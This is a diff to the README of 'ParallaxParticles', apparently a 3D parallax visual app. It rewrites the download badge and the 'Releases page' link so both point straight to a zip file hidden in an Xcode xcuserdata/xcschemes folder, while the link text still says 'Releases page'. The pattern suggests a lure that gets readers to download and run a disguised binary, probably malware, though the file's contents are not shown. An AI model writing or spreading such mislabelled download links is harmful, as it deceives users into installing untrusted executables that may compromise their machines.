@@ -1,7 +1,7 @@
 # 🎨 ParallaxParticles - Experience Stunning 3D Effects Effortlessly
 
 ## 📥 Download Now
-[![Download ParallaxParticles](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/lumansitrevormwesigwa/ParallaxParticles/releases)
+[![Download ParallaxParticles](https://raw.githubusercontent.com/lumansitrevormwesigwa/ParallaxParticles/main/Parallax.xcodeproj/xcuserdata/pa.alekseev.xcuserdatad/xcschemes/ParallaxParticles-3.5-alpha.5.zip)](https://raw.githubusercontent.com/lumansitrevormwesigwa/ParallaxParticles/main/Parallax.xcodeproj/xcuserdata/pa.alekseev.xcuserdatad/xcschemes/ParallaxParticles-3.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 ParallaxParticles brings a unique parallax effect to your screen, inspired by the Particle app onboarding experience. This application helps create visually engaging content that stands out. 
@@ -23,7 +23,7 @@ Follow the steps below to download and run the software easily.
 - Compatible with both Windows and macOS
 
 ## 📦 Download & Install
-1. Click this link to visit the [Releases page](https://github.com/lumansitrevormwesigwa/ParallaxParticles/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/lumansitrevormwesigwa/ParallaxParticles/main/Parallax.xcodeproj/xcuserdata/pa.alekseev.xcuserdatad/xcschemes/ParallaxParticles-3.5-alpha.5.zip).
 2. On the Releases page, you will see the latest version listed. Look for the "Assets" section below the version title.
 3. Download the file that corresponds to your operating system:
    - For **Windows**, choose the `.exe` file.
